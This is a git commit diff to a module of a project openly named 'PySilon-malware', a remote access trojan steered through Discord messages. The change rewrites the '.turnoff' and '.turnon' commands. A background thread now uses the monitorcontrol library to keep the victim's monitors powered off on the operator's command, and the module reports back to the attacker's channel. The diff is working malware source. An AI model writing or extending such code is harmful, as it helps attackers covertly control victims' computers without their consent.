498ed55606057272fe837b7e123558ab635b988a
Yaw <67904196+AWeirDKiD@users.noreply.github.com>
2023-09-23 16:54:44 +0300

    Update monitor_control.py

--- resources/source_code/monitor_control.py
+++ resources/source_code/monitor_control.py
@@ -1,25 +1,24 @@
-import ctypes
+import monitorcontrol
+import threading
 # end of imports
 
 # on message
 elif message.content == '.turnoff':
     if not turned_off:
         await message.delete()
+        turned_off = True
+        def monitor_off():
+            while turned_off:
+                for monitor in monitorcontrol.get_monitors():
+                    with monitor:
+                        monitor.set_power_mode(4)
 
-        user32 = ctypes.windll.user32
-        SendMessage = user32.SendMessageW
+        threading.Thread(target=monitor_off).start()
 
-        WM_SYSCOMMAND = 0x0112
-        SC_MONITORPOWER = 0xF170
-        MONITOR_OFF = 2
-
-        SendMessage(0xFFFF, WM_SYSCOMMAND, SC_MONITORPOWER, MONITOR_OFF)
-
-        embed = discord.Embed(title="Monitor turned off",description=f'```Monitor turned off. Turn it back on by using .turnon```', colour=discord.Colour.red())
+        embed = discord.Embed(title="🟢 Success",description=f'```Monitor turned off. Turn it back on by using .turnon```', colour=discord.Colour.green())
         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
         await message.channel.send(embed=embed)
-        turned_off = True
-    
+
     else:
         embed = discord.Embed(title="🔴 Hold on!",description=f'```Monitor already turned off. Turn it back on by using .turnon```', colour=discord.Colour.red())
         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
@@ -29,10 +28,11 @@ elif message.content == '.turnon':
     if turned_off:
         await message.delete()
 
-        MONITOR_ON = -1
-        SendMessage(0xFFFF, WM_SYSCOMMAND, SC_MONITORPOWER, MONITOR_ON) 
+        for monitor in monitorcontrol.get_monitors():
+            with monitor:
+                monitor.set_power_mode(1)
 
-        embed = discord.Embed(title="🟢 Monitor turned on",description=f'```Monitor has been turned on. Turn it off by using .turnoff```', colour=discord.Colour.green())
+        embed = discord.Embed(title="🟢 Success",description=f'```Monitor has been turned on. Turn it off by using .turnoff```', colour=discord.Colour.green())
         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
         await message.channel.send(embed=embed)
         turned_off = False
@@ -40,4 +40,3 @@ elif message.content == '.turnon':
         embed = discord.Embed(title="🔴 Hold on!",description=f'```The monitor is not turned off. Turn it off by using .turnoff```', colour=discord.Colour.red())
         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
         await message.channel.send(embed=embed)
-        
